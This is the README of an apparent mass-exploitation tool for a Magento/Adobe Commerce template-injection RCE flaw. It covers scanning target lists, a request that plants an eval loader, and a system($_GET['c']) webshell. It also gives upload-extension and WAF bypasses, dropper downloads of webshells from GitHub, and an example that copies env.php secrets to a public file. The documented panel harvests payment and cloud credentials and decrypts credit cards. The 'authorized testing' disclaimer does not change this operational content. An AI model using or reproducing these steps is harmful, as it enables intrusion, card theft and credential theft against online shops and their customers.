# StyleSmuggler Scanner

**CVE-2026-75650 Exploitation Framework - Standalone Edition**

![Version](https://img.shields.io/badge/version-2.0-blue.svg)
![Python](https://img.shields.io/badge/python-3.8+-green.svg)
![License](https://img.shields.io/badge/license-Research-red.svg)

---

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Options Guide](#options-guide)
- [Usage Examples](#usage-examples)
- [Output Files](#output-files)
- [Technical Details](#technical-details)
- [Troubleshooting](#troubleshooting)
- [Disclaimer](#disclaimer)

---

## 🎯 Overview

**StyleSmuggler Scanner** is a comprehensive exploitation framework for CVE-2026-75650, a critical RCE vulnerability affecting Adobe Commerce and Magento 2. This standalone edition includes:

- **Automated vulnerability scanning**
- **Proof-of-concept marker deployment**
- **RCE shell deployment**
- **Full webshell deployment (Bob Marley + Mage Control Panel)**
- **Single-target precision exploitation**

### Vulnerability Details

- **CVE ID:** CVE-2026-75650
- **Severity:** Critical (CVSS 9.8)
- **Affected:** Adobe Commerce 2.3.x - 2.4.x, Magento Open Source 2.3.x - 2.4.x
- **Type:** Server-Side Template Injection (SSTI) → Remote Code Execution (RCE)
- **Attack Vector:** GraphQL + Template Engine + Gadget Chain

---

## ✨ Features

### Core Capabilities

✅ **5 Operation Modes:**
- Vulnerability scanning with automatic path detection
- Proof-of-concept marker deployment
- Simple RCE shell deployment
- Full webshell deployment (Bob + Mage)
- Single-target precision mode

✅ **Advanced Exploitation:**
- 50+ extension bypass techniques (`.php.` `.phar.` `.phtml.` etc.)
- Automatic path bruteforce (Apache, Nginx, cPanel, Plesk, Docker)
- PHP execution verification (prevents false positives)
- Unique marker-based validation

✅ **Robust Download System:**
- wget → curl → requests fallback chain
- Server-side wget/curl fallback in droppers
- Automatic retry on network failures

✅ **WAF Bypass:**
- 15+ bypass headers (Cloudflare, ModSecurity, AWS WAF)
- Random filename generation
- Stealth operations

✅ **Output Management:**
- Dual scan output (full details + URLs only)
- Organized result directories
- Timestamped reports

---

## 🔧 Installation

### Requirements

```bash
# Python 3.8 or higher
python3 --version

# Required packages
pip3 install requests urllib3
```

### Download

```bash
# Clone or download
wget https://yourdomain.com/stylesmuggler.py.py

# Make executable
chmod +x stylesmuggler.py.py
```

### Quick Test

```bash
python3 stylesmuggler.py.py
```

---

## 🚀 Quick Start

### 1. Prepare Target List

Create a file with target URLs (one per line):

```bash
cat > targets.txt << EOF
https://shop1.example.com
https://shop2.example.com
https://magento.site.com
EOF
```

### 2. Scan for Vulnerabilities

```bash
python3 stylesmuggler.py.py
# Select: 1 (Scan Vulnerability)
# Input: targets.txt
```

**Output:**
- `scan_results.txt` - Full details (URL + Path + Report ID)
- `scan_results_urls.txt` - Vulnerable URLs only

### 3. Deploy (Choose One)

**Option A: Proof of Concept (Safe)**
```bash
# Select: 2 (Txt Marker RCE)
# Input: scan_results_urls.txt
# Creates text files to prove RCE
```

**Option B: Simple Shells**
```bash
# Select: 3 (RCE)
# Input: scan_results_urls.txt
# Deploys basic PHP shells
```

**Option C: Full Webshells (Recommended)**
```bash
# Select: 4 (Upload Webshell)
# Input: scan_results_urls.txt
# Deploys Bob Marley File Manager + Mage Control Panel
```

---

## 📚 Options Guide

### **Option 1: Scan Vulnerability** 🔍

**Purpose:** Identify vulnerable targets and detect report paths

**Input:**
- Target list file (URLs, one per line)

**Process:**
1. Stage 1: Poison report (inject PHP eval loader)
2. Stage 2: Create cart, set email, billing address
3. Test 10 common paths per target
4. Verify RCE possibility

**Output:**
- `scan_results.txt` - Full format (for Option 5)
- `scan_results_urls.txt` - URLs only (for Options 2,3,4)

**Use When:**
- Starting a new campaign
- Discovering vulnerable sites
- Need path information

---

### **Option 2: Txt Marker RCE** 📝

**Purpose:** Proof of concept - prove RCE without deploying shells

**Input:**
- `scan_results_urls.txt` (from Option 1)
- Custom marker text (default: "Bob Marley is here")

**Process:**
1. Exploit each target
2. Create `.txt` file with marker
3. Verify file creation
4. No path input needed (auto bruteforce 8 paths)

**Output:**
- `marker_results.txt` - List of marker URLs

**Use When:**
- Testing proof of concept
- Need safe verification
- Want to confirm RCE before deploying shells

**Example Marker File:**
```
Bob Marley is here
https://target.com/sm_abc123.txt
```

---

### **Option 3: RCE** 💣

**Purpose:** Deploy simple interactive PHP shells with directory bypass

**Input:**
- `scan_results_urls.txt` (from Option 1)

**Process:**
1. Create randomized directory (`cache_abc123/`)
2. Upload `.htaccess` to enable PHP execution
3. Deploy interactive shell (`<?php system($_GET['c']);?>`)
4. Create marker with shell URL and `id` output
5. No path input needed (auto bruteforce 8 paths)

**Output:**
- `rce_results.txt` - Full details (uid, shell URL, directory listing)
- `RCE.txt` - Target URLs only

**Shell Usage:**
```bash
# Example shell URL
https://target.com/cache_abc123/s_def456.php?c=id

# Commands
?c=id
?c=whoami
?c=pwd
?c=ls -la
```

**Use When:**
- Need quick command execution
- Want simple lightweight shells
- Testing system access

---

### **Option 4: Upload Webshell (Bob + Mage)** 🚀 **[RECOMMENDED]**

**Purpose:** Deploy full-featured webshells with GUI

**Input:**
- `scan_results_urls.txt` (from Option 1)

**Process:**
1. Download Bob + Mage from GitHub (wget/curl fallback)
2. Test 50+ extensions per target (first 15 for speed)
3. Verify PHP execution (not just upload)
4. Deploy both shells using working extension
5. No path input needed (auto bruteforce 3 paths per extension)

**Output:**
- `Bob_Shells.txt` - Bob Marley File Manager URLs
- `Mage_Shells.txt` - Mage Control Panel URLs

**Extensions Tested:**
```
Priority: .php. .phar. .phtml. (trailing dots - PROVEN!)
Also tests: .php.. .phar.. .php  .phar  .pHp .phAr
Plus: .php%00.jpg .jpg.php .inc. .module (37 total)
```

**Bob Marley Features:**
- File Manager (browse, upload, download, edit)
- Command Execution (terminal)
- File Editor (view/edit any file)
- Web-based UI (no curl needed)

**Mage Control Panel Features:**
- Order & Revenue Statistics
- Payment Methods Analysis
- Credential Harvester (Stripe, AWS SES, SMTP)
- Credit Card Decryptor
- Command Execution
- Auto Telegram Notifications

**Use When:**
- Need full file management
- Want persistent GUI access
- Require credential harvesting
- Need Magento-specific tools

---

### **Option 5: Single Target RCE** 🎯

**Purpose:** Precise exploitation of a single known target

**Input:**
- Target URL (manual)
- Report path (manual - from scan_results.txt)

**Process:**
1. Choose payload type:
   - **[1] Mini Webshell** - Full PHP file manager
   - **[2] Interactive Shell** - Simple command execution
   - **[3] Dropper** - wget/curl mage.php
   - **[4] Custom PHP** - Your own code
2. Execute with specified path
3. Verify with unique markers

**Output:**
- `single_rce.txt` - Deployment log

**Payload Details:**

**1. Mini Webshell**
```php
// Downloads mini.php from GitHub (wget/curl fallback)
// Random filename: mini_abc123.php
// Full file manager interface
```

**2. Interactive Shell**
```php
// Creates: cache_abc/s_def.php
// Usage: ?c=command
// Includes .htaccess for PHP execution
```

**3. Dropper (Recommended for stealth)**
```php
// Creates: bob_abc123.txt (report file)
// Downloads: mage_def456.php (full control panel)
// Uses: wget || curl (server-side fallback)
// Reports: Download status, file verification
```

**4. Custom PHP**
```php
// Paste your own PHP code
// Multi-line support
// Wrapped with verification marker
```

**Use When:**
- Know exact path from previous scan
- Need specific payload
- Want custom PHP execution
- Testing different payloads

---

## 💡 Usage Examples

### Example 1: Full Campaign

```bash
# Step 1: Scan targets
python3 stylesmuggler.py.py
Select: 1
Target file: all_magento_sites.txt
Verbose: y

# Output: 
# - scan_results.txt (5 vulnerable, paths included)
# - scan_results_urls.txt (5 URLs)

# Step 2: Deploy full webshells
python3 stylesmuggler.py.py
Select: 4
Target file: scan_results_urls.txt
Verbose: n
Deploy? y

# Output:
# - Bob_Shells.txt (4 successful)
# - Mage_Shells.txt (4 successful)

# Step 3: Access shells
firefox $(head -1 Bob_Shells.txt)
```

### Example 2: Proof of Concept Only

```bash
# Scan
python3 stylesmuggler.py.py
Select: 1
Target file: client_sites.txt

# Deploy markers (safe)
Select: 2
Target file: scan_results_urls.txt
Marker: POC-2026-09-21

# Verify
curl https://target.com/sm_abc123.txt
# Output: POC-2026-09-21
```

### Example 3: Single Target Precision

```bash
# From scan results, we know:
# URL: https://shop.example.com
# Path: /var/www/html/var/report

python3 stylesmuggler.py.py
Select: 5
Target: https://shop.example.com
Path: /var/www/html/var/report
Verbose: y
Payload: 3 (Dropper)

# Check dropper report
curl https://shop.example.com/bob_abc123.txt

# Access shell
curl https://shop.example.com/mage_def456.php
```

### Example 4: Custom Payload

```bash
python3 stylesmuggler.py.py
Select: 5
Target: https://target.com
Path: /home/magento/public_html/var/report
Payload: 4 (Custom)

# Paste your code:
file_put_contents('config.php', file_get_contents('/app/etc/env.php'));
file_put_contents('dump.txt', 'Config exported');
END

Output filename: dump.txt

# Verify
curl https://target.com/dump.txt
curl https://target.com/config.php
```

---

## 📂 Output Files

### Directory Structure

```
Result_20260921_020000/
├── scan_results.txt          # Full scan results
├── scan_results_urls.txt     # Vulnerable URLs only
├── marker_results.txt        # Marker deployment results
├── rce_results.txt           # RCE deployment details
├── RCE.txt                   # RCE target URLs
├── Bob_Shells.txt            # Bob webshell URLs
├── Mage_Shells.txt           # Mage panel URLs
└── single_rce.txt            # Single target logs
```

### File Formats

**scan_results.txt** (Option 1)
```
SCAN RESULTS - 2026-09-21 02:00:00
============================================================

Target: https://example.com
Status: VULNERABLE
Path: /var/www/html/var/report
Report ID: abc123def456...
------------------------------------------------------------
```

**scan_results_urls.txt** (Option 1)
```
https://vulnerable1.com
https://vulnerable2.com
https://vulnerable3.com
```

**Bob_Shells.txt** (Option 4)
```
https://site1.com/b_a1b2.phar.
https://site2.com/b_c3d4.phtml.
```

**rce_results.txt** (Option 3)
```
Target: https://example.com
Output:
[RCE Verified]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux server 5.4.0-42-generic

[Shell URL]
cache_abc123/s_def456.php?c=id

[Directory Listing]
-rw-r--r-- 1 www-data www-data 35 Sep 21 02:10 s_def456.php
------------------------------------------------------------
```

---

## 🔬 Technical Details

### Exploitation Chain

```
1. Stage 1: Report Poisoning
   POST /paypal/transparent/response/?<?=eval(base64_decode($_GET[0]))?>
   └─> Creates poisoned report with PHP eval loader

2. Stage 2: Gadget Chain Trigger
   POST /graphql?type=2&text={{block}}&styles[first]=/path/report_id&...
   └─> GraphQL mutation: handlePayflowProResponse
       └─> PaymentFailuresService
           └─> Email Template Preview
               └─> ColumnSet
                   └─> UrlGeneratorFactory
                       └─> Aws\S3\S3Client
                           └─> ArrayScanner::collectEntities()
                               └─> include($report_file)
                                   └─> eval($_GET[0])
                                       └─> RCE!

3. Payload Execution
   Base64-encoded PHP executes on server
```

### Path Bruteforce List

The scanner tests these paths automatically:

**Apache/LAMP:**
```
/var/www/html/var/report
/var/www/magento/var/report
/var/www/magento2/var/report
```

**Nginx:**
```
/usr/share/nginx/html/var/report
/usr/share/nginx/html/magento/var/report
```

**cPanel/DirectAdmin:**
```
/home/{user}/public_html/var/report
/home/{user}/domains/{domain}/public_html/var/report
```

**Plesk:**
```
/var/www/vhosts/{domain}/httpdocs/var/report
```

**Docker/Cloud:**
```
/app/var/report
/opt/magento/var/report
```

### Extension Bypass Techniques

**Priority Extensions (PROVEN):**
- `.php.` - Trailing dot (Apache mishandles)
- `.phar.` - PHP archive with trailing dot
- `.phtml.` - PHP template with trailing dot

**Advanced Techniques:**
- Double dots: `.php..`
- Trailing spaces: `.php ` (filesystem ignores)
- Case bypass: `.pHp` (Windows/case-insensitive)
- Null byte: `.php%00.jpg` (truncates at %00)
- Double extension: `.jpg.php` (MIME confusion)

### Verification Methods

**Marker Verification:**
```python
unique_marker = f"SHELL_{secrets.token_hex(8)}"
# Write marker before payload execution
# Check marker exists with unique ID
# Prevents false positives from cached responses
```

**Execution Verification:**
```python
# Check if PHP source code visible
if '<?php' in response[:200]:
    return "NOT_EXECUTING"  # File uploaded but not executing

# Check for shell signatures
if 'mini' in response or 'command' in response:
    return "EXECUTING"  # PHP executing properly
```

---

## 🛠️ Troubleshooting

### Issue: "No report id found"

**Cause:** Target not vulnerable or WAF blocking

**Solution:**
```bash
# Try different endpoints
# Check if site is actually Magento
curl -I https://target.com/graphql
```

### Issue: "All extensions failed"

**Cause:** Strong PHP execution filters

**Solutions:**
1. Use Option 3 (RCE) - creates directory with `.htaccess`
2. Try Option 5 with dropper - uses server-side wget/curl
3. Check if target allows `.phar` extension

### Issue: "Transaction has been declined"

**Cause:** Cart ID issue or billing address rejection

**Solution:**
```bash
# Enable verbose mode
Verbose: y

# Check DEBUG output for cart_id
# Verify billing address country acceptance
```

### Issue: "wget/curl failed"

**Cause:** GitHub blocked or network issue

**Solution:**
```bash
# The script auto-falls back: requests → wget → curl
# If all fail, manually download and host locally:

# Download shells
wget https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/mini.php
wget https://raw.githubusercontent.com/khadafigans/Magento-StyleSmuggler/refs/heads/main/mage.php

# Host locally (change URLs in script if needed)
```

### Issue: Shell uploaded but not executing

**Cause:** PHP execution disabled for that extension

**Solution:**
1. Option 4 tests 50+ extensions automatically
2. Option 3 creates `.htaccess` to force PHP execution
3. Try `.phar` or `.phtml` which may bypass filters

### Issue: "File not found" after successful upload

**Cause:** Shell in different directory

**Check locations:**
```bash
# Root
https://target.com/shell.php

# Media directories
https://target.com/pub/shell.php
https://target.com/pub/media/customer_address/x/y/shell.php
https://target.com/media/customer_address/x/y/shell.php
```

---

## ⚠️ Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**

This tool is provided for:
- Security research
- Authorized penetration testing
- Vulnerability assessment with explicit permission

**Illegal usage is strictly prohibited.**

- ❌ Do NOT use on systems without explicit written authorization
- ❌ Do NOT use for malicious purposes
- ❌ Do NOT deploy on production systems without permission
- ❌ Do NOT access or exfiltrate data without authorization

**Legal Consequences:**
Unauthorized access to computer systems is illegal in most jurisdictions:
- USA: Computer Fraud and Abuse Act (CFAA)
- EU: Computer Misuse Act, GDPR violations
- International: Various cybercrime laws

**Ethical Guidelines:**
1. Always obtain written permission before testing
2. Respect scope limitations
3. Report findings responsibly
4. Do not cause damage or disruption
5. Protect discovered credentials and data

**Liability:**
The authors and contributors are not responsible for misuse of this tool.
Users assume all legal responsibility for their actions.

---

## 📖 References

- [Sansec StyleSmuggler Analysis](https://sansec.io/research/stylesmuggler-0day)
- [CVE-2026-75650 Details](https://nvd.nist.gov/)
- [Adobe Commerce Security Bulletin](https://helpx.adobe.com/security.html)
- [Magento Security Center](https://www.magento.com/security)

---

## 🔗 Credits

**Research:**
- Sansec Security Team (Original discovery)
- Fortbridge Security (PoC development)
- Bob Research Labs (Tool development)

**Tool Development:**
- StyleSmuggler Standalone Edition
- SessionReaper Integration
- Extension bypass research


## ⚖️ Legal Disclaimer

For authorized penetration testing, bug bounty programs, and educational purposes only. Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act 1990 - UK
- EU Cybersecurity Act

**USE AT YOUR OWN RISK.** Author assumes NO LIABILITY for misuse.

By using this tool, you confirm you have explicit authorization to test target systems.

---
**Buy me a Coffee:**
```
₿ BTC: 17sbbeTzDMP4aMELVbLW78Rcsj4CDRBiZh
```

© 2026 khadafigans
